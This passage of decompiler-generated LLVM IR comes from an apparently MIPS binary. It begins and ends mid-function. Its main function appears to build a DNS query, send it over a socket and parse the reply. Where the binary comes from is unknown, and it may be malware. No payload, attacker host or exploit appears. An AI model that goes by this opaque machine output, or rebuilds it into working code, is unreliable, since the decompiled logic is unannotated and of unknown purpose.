  %v2_402988 = load i8, i8* %v1_402988, align 1
  %v2_402990 = load i32, i32* %s2.global-to-local, align 4
  %v3_402990 = inttoptr i32 %v2_402990 to i8*
  store i8 %v2_402988, i8* %v3_402990, align 1
  %v0_402994 = load i32, i32* %s2.global-to-local, align 4
  %v1_402994 = add i32 %v0_402994, 1
  store i32 %v1_402994, i32* %s2.global-to-local, align 4
  %v0_402998 = load i32, i32* %s1.global-to-local, align 4
  %v1_402998 = add i32 %v0_402998, -1
  store i32 %v1_402998, i32* %s1.global-to-local, align 4
  %v3_4029a0 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_4029a0, i32* @t9, align 4
  %v3_4029a4 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_4029a4, i32* @s3, align 4
  %v2_4029a8 = icmp eq i32 %v0_402998, 0
  br i1 %v2_4029a8, label %dec_label_pc_4029ac, label %dec_label_pc_40294c

dec_label_pc_4029ac:                              ; preds = %dec_label_pc_40294c
  store i32 %v0_40292c, i32* @s3, align 4
  ret i32 -1
}

define i32 @function_4029cc() local_unnamed_addr {
dec_label_pc_4029cc:
  %v0_4029e4 = load i32, i32* @s0, align 4
  %v3_4029ec = load i32, i32* @global_var_449340.219, align 4
  store i32 %v3_4029ec, i32* @t9, align 4
  %v3_4029f4 = call i32 @function_404fa0(i32* null)
  %v3_402a08 = load i32, i32* @global_var_449484.220, align 4
  store i32 %v3_402a08, i32* @t9, align 4
  store i32 %v3_4029f4, i32* @global_var_44951c.215, align 4
  %v5_402a10 = call i32 @function_404a90()
  %v3_402a20 = load i32, i32* @global_var_449348.6, align 4
  store i32 %v3_402a20, i32* @t9, align 4
  store i32 %v5_402a10, i32* @s0, align 4
  %v2_402a28 = call i32 @function_404af0()
  %v0_402a34 = load i32, i32* @s0, align 4
  %v2_402a34 = xor i32 %v0_402a34, %v2_402a28
  %v3_402a38 = load i32, i32* @global_var_4492b0.221, align 4
  store i32 %v3_402a38, i32* @t9, align 4
  store i32 %v2_402a34, i32* @global_var_449520.217, align 4
  %v5_402a40 = call i32 @function_4054b0()
  %v3_402a4c = load i32, i32* @global_var_449520.217, align 4
  %v2_402a54 = xor i32 %v3_402a4c, %v5_402a40
  store i32 %v2_402a54, i32* @global_var_449528.216, align 4
  store i32 %v5_402a40, i32* @global_var_449524.218, align 4
  store i32 %v0_4029e4, i32* @s0, align 4
  ret i32 %v5_402a40

; uselistorder directives
  uselistorder i32 %v5_402a40, { 1, 2, 0 }
  uselistorder i32 ()* @function_404af0, { 1, 0 }
}

define i32 @function_402a7c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_402a7c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i8 @__decompiler_undefined_function_1()
  %tmp33 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i16 @__decompiler_undefined_function_2()
  %tmp36 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-2075 = alloca i8, align 1
  %stack_var_-2065 = alloca i32, align 4
  %stack_var_-2077 = alloca i32, align 4
  %stack_var_-2082 = alloca i32, align 4
  %stack_var_-2084 = alloca i32, align 4
  %stack_var_-2096 = alloca i16, align 2
  %stack_var_-4296 = alloca i32, align 4
  %stack_var_-4272 = alloca i32, align 4
  %stack_var_-4288 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4132 = alloca i32, align 4
  %v1_402a84 = load i32, i32* @t9, align 4
  %v2_402a84 = add i32 %v1_402a84, 321364
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v0_402a90 = load i32, i32* @fp, align 4
  %v0_402ab0 = load i32, i32* @s0, align 4
  %v3_402ab8 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_402ab8, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  store i32 262, i32* %a1.global-to-local, align 4
  %v4_402acc = call i32 @function_405e80(i64 1, i32 262)
  store i32 %v4_402acc, i32* @v0, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v0_402ad8 = load i32, i32* @s0, align 4
  store i32 %v0_402ad8, i32* %a0.global-to-local, align 4
  store i32 %v4_402acc, i32* %s3.global-to-local, align 4
  %v3_402ae4 = call i32 @function_404200(i32 %v0_402ad8)
  store i32 %v3_402ae4, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v3_402ae4, i32* %s1.global-to-local, align 4
  %v3_402af4 = load i32, i32* @global_var_449324.222, align 4
  store i32 %v3_402af4, i32* @t9, align 4
  %v3_402afc = ptrtoint i32* %stack_var_-4132 to i32
  store i32 %v3_402afc, i32* %s4.global-to-local, align 4
  %v4_402afc = call i32 @function_404688()
  store i32 %v4_402afc, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v2_402b08 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_402afc, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 46, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_402b20

dec_label_pc_402b20:                              ; preds = %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge, %dec_label_pc_402a7c
  %v2_402b30 = phi i32 [ %v2_402b3010, %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge ], [ %v3_402afc, %dec_label_pc_402a7c ]
  %v4_402b28 = phi i32 [ %v4_402b288, %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge ], [ 0, %dec_label_pc_402a7c ]
  %v3_402b28 = phi i32 [ %v1_402b64, %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge ], [ 0, %dec_label_pc_402a7c ]
  %v1_402b28 = phi i32 [ %v1_402b28.pre, %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge ], [ 46, %dec_label_pc_402a7c ]
  %v0_402b20 = phi i32 [ %v4_402b6c, %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge ], [ %v4_402afc, %dec_label_pc_402a7c ]
  %v1_402b20 = inttoptr i32 %v0_402b20 to i8*
  %v2_402b20 = load i8, i8* %v1_402b20, align 1
  %v3_402b20 = sext i8 %v2_402b20 to i32
  %v2_402b28 = icmp eq i32 %v3_402b20, %v1_402b28
  %v5_402b28 = sub i32 %v3_402b28, %v4_402b28
  store i32 %v5_402b28, i32* %v0.global-to-local, align 4
  br i1 %v2_402b28, label %dec_label_pc_402b2c, label %dec_label_pc_402b64

dec_label_pc_402b2c:                              ; preds = %dec_label_pc_402b20
  %v1_402b30 = trunc i32 %v5_402b28 to i8
  %v3_402b30 = inttoptr i32 %v2_402b30 to i8*
  store i8 %v1_402b30, i8* %v3_402b30, align 1
  %v0_402b34 = load i32, i32* @s0, align 4
  %v1_402b34 = load i32, i32* %a1.global-to-local, align 4
  %v2_402b34 = add i32 %v1_402b34, %v0_402b34
  store i32 %v2_402b34, i32* %a0.global-to-local, align 4
  %v0_402b3c = load i32, i32* %a3.global-to-local, align 4
  %v1_402b3c = add i32 %v0_402b3c, 1
  store i32 %v1_402b3c, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_402b40

dec_label_pc_402b40:                              ; preds = %dec_label_pc_402b40, %dec_label_pc_402b2c
  %v2_402b48 = phi i32 [ %v1_402b4c, %dec_label_pc_402b40 ], [ %v1_402b3c, %dec_label_pc_402b2c ]
  %v0_402b40 = phi i32 [ %v1_402b58, %dec_label_pc_402b40 ], [ %v2_402b34, %dec_label_pc_402b2c ]
  %v1_402b40 = add i32 %v0_402b40, -1
  %v2_402b40 = inttoptr i32 %v1_402b40 to i8*
  %v3_402b40 = load i8, i8* %v2_402b40, align 1
  %v3_402b48 = inttoptr i32 %v2_402b48 to i8*
  store i8 %v3_402b40, i8* %v3_402b48, align 1
  %v0_402b4c = load i32, i32* %a3.global-to-local, align 4
  %v1_402b4c = add i32 %v0_402b4c, 1
  store i32 %v1_402b4c, i32* %a3.global-to-local, align 4
  %v0_402b50 = load i32, i32* %a1.global-to-local, align 4
  %v1_402b50 = load i32, i32* %a2.global-to-local, align 4
  %v2_402b50 = icmp slt i32 %v0_402b50, %v1_402b50
  %v3_402b50 = zext i1 %v2_402b50 to i32
  store i32 %v3_402b50, i32* %v0.global-to-local, align 4
  %v1_402b54 = add i32 %v0_402b50, 1
  store i32 %v1_402b54, i32* %v1.global-to-local, align 4
  %v0_402b58 = load i32, i32* %a0.global-to-local, align 4
  %v1_402b58 = add i32 %v0_402b58, 1
  store i32 %v1_402b58, i32* %a0.global-to-local, align 4
  store i32 %v1_402b54, i32* %a1.global-to-local, align 4
  br i1 %v2_402b50, label %dec_label_pc_402b40, label %dec_label_pc_402b64

dec_label_pc_402b64:                              ; preds = %dec_label_pc_402b40, %dec_label_pc_402b20
  %v0_402b64 = phi i32 [ %v3_402b28, %dec_label_pc_402b20 ], [ %v1_402b50, %dec_label_pc_402b40 ]
  %v2_402b3010 = phi i32 [ %v2_402b30, %dec_label_pc_402b20 ], [ %v1_402b4c, %dec_label_pc_402b40 ]
  %v4_402b288 = phi i32 [ %v4_402b28, %dec_label_pc_402b20 ], [ %v1_402b54, %dec_label_pc_402b40 ]
  %v1_402b64 = add i32 %v0_402b64, 1
  store i32 %v1_402b64, i32* %a2.global-to-local, align 4
  %v1_402b68 = load i32, i32* %s1.global-to-local, align 4
  %v2_402b68 = icmp slt i32 %v1_402b64, %v1_402b68
  %v2_402b6c = load i32, i32* @s0, align 4
  %v4_402b6c = add i32 %v2_402b6c, %v1_402b64
  store i32 %v4_402b6c, i32* %v0.global-to-local, align 4
  br i1 %v2_402b68, label %dec_label_pc_402b64.dec_label_pc_402b20_crit_edge, label %dec_label_pc_402b70

dec_label_pc_402b64.dec_label_pc_402b20_crit_edge: ; preds = %dec_label_pc_402b64
  %v1_402b28.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_402b20

dec_label_pc_402b70:                              ; preds = %dec_label_pc_402b64
  %v1_402abc = urem i32 %arg2, 256
  %v3_402b74 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_402b74, i32* @t9, align 4
  store i32 %v3_402afc, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-4132, align 4
  %v4_402b7c = call i32 @function_4028bc()
  %v5_402b7c = sext i32 %v4_402b7c to i64
  %v5_402b8c = mul nuw nsw i64 %v5_402b7c, 2147516417
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v3_402afc, i32* %a0.global-to-local, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 1, i32* %s6.global-to-local, align 4
  %v1_402ba826 = udiv i64 %v5_402b8c, 140737488355328
  %v1_402ba8 = trunc i64 %v1_402ba826 to i32
  store i32 %v1_402ba8, i32* %v1.global-to-local, align 4
  %v3_402bac = add i32 %v1_402ba8, %v4_402b7c
  store i32 %v3_402bac, i32* @v0, align 4
  %v2_402bb0 = urem i32 %v3_402bac, 65536
  store i32 %v2_402bb0, i32* @fp, align 4
  %v4_402bb0 = call i32 @function_404200(i32 %v3_402afc)
  store i32 %v4_402bb0, i32* @v0, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v3_402afc, i32* %a0.global-to-local, align 4
  %v2_402bc8 = add i32 %v4_402bb0, 17
  store i32 %v2_402bc8, i32* %s7.global-to-local, align 4
  %v4_402bc8 = call i32 @function_404200(i32 %v3_402afc)
  store i32 2, i32* %stack_var_-4288, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v1_402abc, i32* %v1.global-to-local, align 4
  %v0_402bfc = load i32, i32* %s4.global-to-local, align 4
  %v2_402bfc = add i32 %v0_402bfc, %v4_402bc8
  store i32 %v2_402bfc, i32* %v0.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v0_402c08 = load i32, i32* @fp, align 4
  store i32 %v0_402c08, i32* %stack_var_-4144, align 4
  %v3_402c0c = add i32 %v2_402bfc, 3
  %v4_402c0c = inttoptr i32 %v3_402c0c to i16*
  store i16 1, i16* %v4_402c0c, align 2
  %v0_402c10 = load i32, i32* %v1.global-to-local, align 4
  %v1_402c10 = trunc i32 %v0_402c10 to i16
  %v2_402c10 = load i32, i32* %v0.global-to-local, align 4
  %v3_402c10 = add i32 %v2_402c10, 1
  %v4_402c10 = inttoptr i32 %v3_402c10 to i16*
  store i16 %v1_402c10, i16* %v4_402c10, align 2
  store i32 -1, i32* @s0, align 4
  %v0_402c18 = load i32, i32* %s2.global-to-local, align 4
  %v2_402c18 = icmp eq i32 %v0_402c18, -1
  br i1 %v2_402c18, label %dec_label_pc_402c38, label %dec_label_pc_402c1c

dec_label_pc_402c1c:                              ; preds = %dec_label_pc_402b70
  %v3_402c20 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_402c20, i32* @t9, align 4
  store i32 %v0_402c18, i32* %a0.global-to-local, align 4
  %v3_402c28 = call i32 @function_4049d0(i32 %v0_402c18)
  store i32 %v3_402c28, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402c38

dec_label_pc_402c38:                              ; preds = %dec_label_pc_402b70, %dec_label_pc_402c1c
  %v3_402c38 = load i32, i32* @global_var_449444.201, align 4
  store i32 %v3_402c38, i32* @t9, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  store i32 0, i32* @a2, align 4
  %v4_402c44 = call i32 @function_405aa0(i32 2, i32 1)
  store i32 %v4_402c44, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v1_402c50 = load i32, i32* @s0, align 4
  %v2_402c50 = icmp eq i32 %v4_402c44, %v1_402c50
  store i32 %v4_402c44, i32* %s2.global-to-local, align 4
  br i1 %v2_402c50, label %dec_label_pc_402c98, label %dec_label_pc_402c54

dec_label_pc_402c54:                              ; preds = %dec_label_pc_402c38
  %v3_402c58 = load i32, i32* @global_var_4494a8.204, align 4
  store i32 %v3_402c58, i32* @t9, align 4
  store i32 %v4_402c44, i32* %a0.global-to-local, align 4
  %v2_402c60 = ptrtoint i32* %stack_var_-4288 to i32
  store i32 %v2_402c60, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  %v4_402c64 = bitcast i32* %stack_var_-4288 to %sockaddr*
  %v5_402c64 = call i32 @function_4056c0(i32 %v4_402c44, %sockaddr* %v4_402c64, i32 16)
  store i32 %v5_402c64, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v1_402c70 = load i32, i32* @s0, align 4
  %v2_402c70 = icmp eq i32 %v5_402c64, %v1_402c70
  %v3_402c70 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v3_402c70, i32* %a0.global-to-local, align 4
  br i1 %v2_402c70, label %dec_label_pc_402c98, label %dec_label_pc_402c74

dec_label_pc_402c74:                              ; preds = %dec_label_pc_402c54
  %v3_402c78 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_402c78, i32* @t9, align 4
  store i32 %v2_402b08, i32* %a1.global-to-local, align 4
  %v0_402c80 = load i32, i32* %s7.global-to-local, align 4
  store i32 %v0_402c80, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_402c84 = call i32 @function_405940(i32 %v3_402c70, i32* nonnull %stack_var_-4144, i32 %v0_402c80, i32 16384)
  store i32 %v6_402c84, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v2_402c90 = icmp eq i32 %v6_402c84, %v0_402c80
  store i32 3, i32* @a1, align 4
  br i1 %v2_402c90, label %dec_label_pc_402cb4, label %dec_label_pc_402c98

dec_label_pc_402c98:                              ; preds = %dec_label_pc_402c74, %dec_label_pc_402c54, %dec_label_pc_402c38
  %v1_402c98 = add i32 %v1_402a84, 289240
  %v2_402c98 = inttoptr i32 %v1_402c98 to i32*
  %v3_402c98 = load i32, i32* %v2_402c98, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402c98)
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v0_402cb0 = load i32, i32* %s6.global-to-local, align 4
  %v1_402cb0 = add i32 %v0_402cb0, 1
  store i32 %v1_402cb0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402cb4

dec_label_pc_402cb4:                              ; preds = %dec_label_pc_402c74, %dec_label_pc_402c98
  %v3_402cb4 = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_402cb4, i32* @t9, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_402cbc = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_402cbc, i32* @a0, align 4
  %v2_402cbc = call i32 @function_404870()
  store i32 %v2_402cbc, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v3_402ccc = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_402ccc, i32* @t9, align 4
  %v0_402cd0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_402cd0, i32* @a0, align 4
  %v2_402cd4 = or i32 %v2_402cbc, 128
  store i32 %v2_402cd4, i32* %a2.global-to-local, align 4
  %v3_402cd4 = call i32 @function_404870()
  %v2_402cdc = ptrtoint i32* %stack_var_-4272 to i32
  store i32 %v2_402cdc, i32* %a1.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v2_402cdc, i32* %v0.global-to-local, align 4
  store i32 %v2_402b08, i32* %v1.global-to-local, align 4
  %v5_402cf4 = ptrtoint i32* %stack_var_-4296 to i32
  br label %dec_label_pc_402cec

dec_label_pc_402cec:                              ; preds = %dec_label_pc_402cec, %dec_label_pc_402cb4
  %v0_402cec = phi i32 [ %v1_402cf0, %dec_label_pc_402cec ], [ %v2_402cdc, %dec_label_pc_402cb4 ]
  %v1_402cec = inttoptr i32 %v0_402cec to i32*
  store i32 0, i32* %v1_402cec, align 4
  %v0_402cf0 = load i32, i32* %v0.global-to-local, align 4
  %v1_402cf0 = add i32 %v0_402cf0, 4
  store i32 %v1_402cf0, i32* %v0.global-to-local, align 4
  %v1_402cf4 = load i32, i32* %v1.global-to-local, align 4
  %v2_402cf4 = icmp eq i32 %v1_402cf0, %v1_402cf4
  store i32 %v5_402cf4, i32* %a0.global-to-local, align 4
  br i1 %v2_402cf4, label %dec_label_pc_402cf8, label %dec_label_pc_402cec

dec_label_pc_402cf8:                              ; preds = %dec_label_pc_402cec
  %v0_402cfc = load i32, i32* %s2.global-to-local, align 4
  %v1_402cfc = udiv i32 %v0_402cfc, 32
  %v1_402d00 = mul nuw nsw i32 %v1_402cfc, 4
  store i32 %v1_402d00, i32* %v0.global-to-local, align 4
  %v2_402d04 = add i32 %v1_402d00, %v5_402cf4
  store i32 %v2_402d04, i32* @s0, align 4
  %v1_402d08 = add i32 %v2_402d04, 24
  %v2_402d08 = inttoptr i32 %v1_402d08 to i32*
  %v3_402d08 = load i32, i32* %v2_402d08, align 4
  %v1_402d0c = urem i32 %v0_402cfc, 32
  store i32 %v1_402d0c, i32* %s1.global-to-local, align 4
  %v2_402d14 = shl i32 1, %v1_402d0c
  %v2_402d18 = or i32 %v3_402d08, %v2_402d14
  store i32 %v2_402d18, i32* %v1.global-to-local, align 4
  %v3_402d1c = load i32, i32* @global_var_449440.224, align 4
  store i32 %v3_402d1c, i32* @t9, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_402d18, i32* %v2_402d08, align 4
  %v0_402d28 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_402d28, i32* %stack_var_-4296, align 4
  %v0_402d34 = load i32, i32* %s2.global-to-local, align 4
  %v1_402d34 = add i32 %v0_402d34, 1
  store i32 %v1_402d34, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v4_402d3c = call i32 @function_404e60(i32 %v1_402d34, i32 0, i32 0)
  store i32 %v4_402d3c, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v2_402d50 = icmp eq i32 %v4_402d3c, -1
  br i1 %v2_402d50, label %dec_label_pc_402f3c, label %dec_label_pc_402d54

dec_label_pc_402d54:                              ; preds = %dec_label_pc_402cf8
  %v1_402d58 = icmp eq i32 %v4_402d3c, 0
  %v2_402d58 = load i32, i32* %s6.global-to-local, align 4
  %v3_402d58 = add i32 %v2_402d58, 1
  store i32 %v3_402d58, i32* %v0.global-to-local, align 4
  br i1 %v1_402d58, label %dec_label_pc_402f24, label %dec_label_pc_402d5c

dec_label_pc_402d5c:                              ; preds = %dec_label_pc_402d54
  %v0_402d60 = load i32, i32* @s0, align 4
  %v1_402d60 = add i32 %v0_402d60, 24
  %v2_402d60 = inttoptr i32 %v1_402d60 to i32*
  %v3_402d60 = load i32, i32* %v2_402d60, align 4
  %v1_402d68 = load i32, i32* %s1.global-to-local, align 4
  %tmp69 = shl i32 1, %v1_402d68
  %v1_402d6c29 = and i32 %tmp69, %v3_402d60
  %v1_402d70 = icmp eq i32 %v1_402d6c29, 0
  store i32 %v3_402d58, i32* %v0.global-to-local, align 4
  br i1 %v1_402d70, label %dec_label_pc_402f24, label %dec_label_pc_402d74

dec_label_pc_402d74:                              ; preds = %dec_label_pc_402d5c
  %v3_402d78 = load i32, i32* @global_var_44944c.225, align 4
  store i32 %v3_402d78, i32* @t9, align 4
  %v2_402d7c = ptrtoint i16* %stack_var_-2096 to i32
  store i32 %v2_402d7c, i32* %s1.global-to-local, align 4
  store i32 %v2_402d7c, i32* %a1.global-to-local, align 4
  store i32 2048, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v0_402d8c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_402d8c, i32* %a0.global-to-local, align 4
  %v10_402d94 = bitcast i16* %stack_var_-2096 to i32*
  %v11_402d94 = call i32 @function_4058c0(i32 %v0_402d8c, i32* %v10_402d94, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v11_402d94, i32* @v0, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 %v3_402afc, i32* %a0.global-to-local, align 4
  %v3_402dac = call i32 @function_404200(i32 %v3_402afc)
  %v1_402db4 = add i32 %v3_402dac, 17
  %v2_402db8 = icmp ult i32 %v11_402d94, %v1_402db4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v2_402dc0 = load i32, i32* %s6.global-to-local, align 4
  %v3_402dc0 = add i32 %v2_402dc0, 1
  store i32 %v3_402dc0, i32* @v0, align 4
  br i1 %v2_402db8, label %dec_label_pc_402f24, label %dec_label_pc_402dc4

dec_label_pc_402dc4:                              ; preds = %dec_label_pc_402d74
  %v2_402dcc = ptrtoint i32* %stack_var_-2084 to i32
  store i32 %v2_402dcc, i32* %s4.global-to-local, align 4
  store i32 %v2_402dcc, i32* %a0.global-to-local, align 4
  %v4_402dd0 = call i32 @function_404200(i32 %v2_402dcc)
  store i32 %v4_402dd0, i32* %v0.global-to-local, align 4
  %v3_402dd8 = load i16, i16* %stack_var_-2096, align 2
  %v4_402dd8 = sext i16 %v3_402dd8 to i32
  store i32 %v4_402dd8, i32* %v1.global-to-local, align 4
  %v3_402ddc = ptrtoint i32* %stack_var_-2082 to i32
  store i32 %v3_402ddc, i32* %a0.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v1_402de4 = load i32, i32* @fp, align 4
  %v2_402de4 = icmp eq i32 %v4_402dd8, %v1_402de4
  %v5_402de4 = ptrtoint i32* %stack_var_-2077 to i32
  br i1 %v2_402de4, label %dec_label_pc_402de8, label %dec_label_pc_402f20

dec_label_pc_402de8:                              ; preds = %dec_label_pc_402dc4
  %v1_402df4 = icmp eq i16 %tmp36, 0
  %v2_402df4 = load i32, i32* %s6.global-to-local, align 4
  %v3_402df4 = add i32 %v2_402df4, 1
  store i32 %v3_402df4, i32* %v0.global-to-local, align 4
  br i1 %v1_402df4, label %dec_label_pc_402f24, label %dec_label_pc_402df8

dec_label_pc_402df8:                              ; preds = %dec_label_pc_402de8
  %v4_402dfc = zext i16 %tmp35 to i32
  store i32 %v1_402abc, i32* %v1.global-to-local, align 4
  %v2_402e08 = icmp eq i32 %v4_402dfc, %v1_402abc
  store i32 %v3_402df4, i32* @v0, align 4
  br i1 %v2_402e08, label %dec_label_pc_402e0c, label %dec_label_pc_402f24

dec_label_pc_402e0c:                              ; preds = %dec_label_pc_402df8
  store i32 %v5_402de4, i32* %a0.global-to-local, align 4
  %v4_402e18 = call i32 @function_404200(i32 %v5_402de4)
  store i32 %v4_402e18, i32* %a2.global-to-local, align 4
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 -65536, i32* %v0.global-to-local, align 4
  store i32 -49152, i32* %a3.global-to-local, align 4
  store i32 %v5_402de4, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v0_402e3c.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402e3c

dec_label_pc_402e3c:                              ; preds = %dec_label_pc_402e6c, %dec_label_pc_402e0c
  %v0_402e74 = phi i32 [ %v0_402e80, %dec_label_pc_402e6c ], [ 0, %dec_label_pc_402e0c ]
  %v0_402e54 = phi i32 [ %v2_402e84, %dec_label_pc_402e6c ], [ %v5_402de4, %dec_label_pc_402e0c ]
  %v0_402e3c = phi i32 [ %v4_402e84, %dec_label_pc_402e6c ], [ %v0_402e3c.pre, %dec_label_pc_402e0c ]
  %v1_402e3c = inttoptr i32 %v0_402e3c to i8*
  %v2_402e3c = load i8, i8* %v1_402e3c, align 1
  %v3_402e3c = zext i8 %v2_402e3c to i32
  %v1_402e44 = mul nuw nsw i32 %v3_402e3c, 256
  store i32 %v1_402e44, i32* %v1.global-to-local, align 4
  %v1_402e48 = icmp ult i8 %v2_402e3c, -64
  %v2_402e48 = zext i1 %v1_402e48 to i32
  store i32 %v2_402e48, i32* %v0.global-to-local, align 4
  br i1 %v1_402e48, label %dec_label_pc_402e6c, label %dec_label_pc_402e50

dec_label_pc_402e50:                              ; preds = %dec_label_pc_402e3c
  %v1_402e54 = add i32 %v0_402e54, 1
  %v2_402e54 = inttoptr i32 %v1_402e54 to i8*
  %v3_402e54 = load i8, i8* %v2_402e54, align 1
  %v4_402e54 = zext i8 %v3_402e54 to i32
  %v2_402e5c = or i32 %v4_402e54, %v1_402e44
  %v1_402e60 = load i32, i32* %a3.global-to-local, align 4
  %v2_402e60 = add i32 %v2_402e5c, %v1_402e60
  %v0_402e64 = load i32, i32* %s1.global-to-local, align 4
  %v2_402e64 = add i32 %v2_402e60, %v0_402e64
  store i32 %v2_402e64, i32* %v0.global-to-local, align 4
  %v1_402e68 = add i32 %v2_402e64, -1
  store i32 %v1_402e68, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_402e6c

dec_label_pc_402e6c:                              ; preds = %dec_label_pc_402e3c, %dec_label_pc_402e50
  %v0_402e6c = phi i32 [ %v0_402e54, %dec_label_pc_402e3c ], [ %v1_402e68, %dec_label_pc_402e50 ]
  %v2_402e6c = add i32 %v0_402e6c, %v0_402e74
  store i32 %v2_402e6c, i32* %v1.global-to-local, align 4
  %v1_402e70 = inttoptr i32 %v2_402e6c to i8*
  %v2_402e70 = load i8, i8* %v1_402e70, align 1
  %v1_402e74 = add i32 %v0_402e74, 1
  store i32 %v1_402e74, i32* %a1.global-to-local, align 4
  %v1_402e78 = add i8 %v2_402e70, 1
  store i8 %v1_402e78, i8* %v1_402e70, align 1
  %v0_402e80 = load i32, i32* %a1.global-to-local, align 4
  %v1_402e80 = load i32, i32* %a2.global-to-local, align 4
  %v2_402e80 = icmp slt i32 %v0_402e80, %v1_402e80
  %v3_402e80 = zext i1 %v2_402e80 to i32
  store i32 %v3_402e80, i32* %v0.global-to-local, align 4
  %v2_402e84 = load i32, i32* %a0.global-to-local, align 4
  %v4_402e84 = add i32 %v2_402e84, %v0_402e80
  store i32 %v4_402e84, i32* %v1.global-to-local, align 4
  br i1 %v2_402e80, label %dec_label_pc_402e3c, label %dec_label_pc_402e88

dec_label_pc_402e88:                              ; preds = %dec_label_pc_402e6c
  %v2_402e8c = ptrtoint i32* %stack_var_-2065 to i32
  store i32 %v2_402e8c, i32* %a1.global-to-local, align 4
  store i32 %v2_402e8c, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v4_402eb8 = zext i8 %tmp34 to i32
  %v4_402ebc = zext i8 %tmp33 to i32
  %v1_402ec0 = mul nuw nsw i32 %v4_402eb8, 256
